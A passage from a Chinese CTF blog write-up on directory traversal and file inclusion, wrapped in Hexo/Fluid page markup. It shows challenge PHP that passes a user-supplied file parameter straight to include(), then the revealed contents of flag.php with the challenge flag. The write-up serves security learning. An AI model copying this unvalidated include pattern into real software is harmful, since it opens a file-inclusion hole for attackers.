返回查找的字符串+后面剩余字符串，总之就是检测</span><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>)&#123;<br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;  <span class="hljs-comment">//flag.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>再试试同样的方法查看flag.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;f6ca3992-6f08-4c09-b7e9-9d70e8c1d702&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>目录穿越&amp;文件包含漏洞</div>
+      <div>http://example.com/2021/11/19/目录穿越&amp;文件包含漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 19, 2021</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/" title="数据结构笔记??">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">数据结构笔记??</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/29/sqli-labs-%E8%A7%A3%E9%A2%98%E7%AC%94%E8%AE%B0-2/" title="sqli_labs 解题笔记(2)">
+                        <span class="hidden-mobile">sqli_labs 解题笔记(2)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
